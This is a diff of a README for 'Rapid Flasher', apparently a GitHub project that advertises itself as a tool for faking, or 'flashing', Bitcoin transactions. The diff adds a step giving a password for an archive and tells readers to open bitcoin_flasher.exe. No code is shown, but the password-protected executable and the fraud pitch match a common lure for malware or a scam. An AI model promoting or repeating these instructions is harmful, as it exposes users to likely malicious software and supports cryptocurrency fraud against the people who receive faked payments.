@@ -3,7 +3,9 @@ Rapid Flasher is a powerful tool for Bitcoin flashing.
 
 #How to use 
 
-Open bitcoin_flasher.exe and start flashing!
+1. The password for the archive is - 123
+
+2. Open bitcoin_flasher.exe and start flashing!
 
 
 ![Image alt](https://github.com/Eyopseope/Bitcoin-transaction/blob/main/flash1.png)
